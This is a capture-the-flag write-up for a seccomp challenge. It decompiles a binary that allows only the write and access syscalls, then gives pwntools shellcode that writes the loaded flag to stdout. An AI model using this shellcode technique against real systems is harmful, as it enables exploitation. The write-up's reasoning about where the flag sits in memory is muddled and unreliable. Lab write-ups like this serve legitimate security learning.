# Seccomp

## Solution

Quick examination of the binary shows that it does four main thing: reads from a flag file, accepts input from user, adds a seccomp, and then runs that user input as shellcode.

For adding the seccomp, the binary does the following:
```
000012de      int64_t rax = seccomp_init(0);
00001302      seccomp_rule_add(rax, 0x7fff0000, 21, 0);
00001322      seccomp_rule_add(rax, 0x7fff0000, 1, 0);
00001335      return seccomp_load(rax);
```
This means that only two syscalls can be called after the seccomp is added: write and access. Our goal is to use that to get the flag. Clearly, we can use the write syscall to print the flag to the screen, but there is a problem: we need to get the flag first.

At first glance, the reasoning around the code that opens the flag is not clear. Let's take a closer look at that:
```
00001224      int32_t rax = rand();
0000124e      int64_t rax_3 = ((int64_t)((rax - (((((int32_t)((((int64_t)rax) * 0x51eb851f) >> 0x20)) >> 5) - (rax >> 0x1f)) * 0x64)) + 0x600001));
00001289      syscall(9, rax_3, 0x1000, 3, 0x22, 0xffffffff, 0);
000012a6      int32_t rax_8 = open("flag.txt", 0);
000012bf      read(rax_8, rax_3, 0x64);
000012d0      return close(rax_8);
```
We can notice from this that the contents of the flag get added onto the flag. Thus, we should be able to write the flag to stdout by giving the address of the stack.

The following code will create shellcode that prints the flag:
```python
shell = asm("""
    mov rax, 1
    mov rdi, 1
    mov rsi, [rsp+8]
    mov rdx, 999
    syscall
""")
```